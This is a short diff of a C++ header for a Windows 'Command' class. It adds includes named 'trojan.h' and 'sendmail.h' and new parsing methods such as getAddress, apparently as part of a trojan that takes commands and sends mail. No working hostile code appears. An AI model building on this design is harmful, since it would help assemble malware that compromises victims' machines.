@@ -1,6 +1,8 @@
 #pragma once
 #define DEBUG true
 
+#include "trojan.h"
+#include "sendmail.h"
 #include <iostream> 
 #include <string>
 #include <windows.h> 
@@ -10,9 +12,10 @@ class Command
 {
 private:
 	std::string _cmd;
-	int getSeparation(std::string cmd);
+	int getSeparation(std::string cmd, std::string code);
 	std::string getTitle(std::string cmd);
-	std::string getMessage(std::string cmd);
+	std::string getMessage(std::string cmd, bool address);
+	std::string getAddress(std::string cmd);
 public:
 	Command(std::string cmd)
 	{
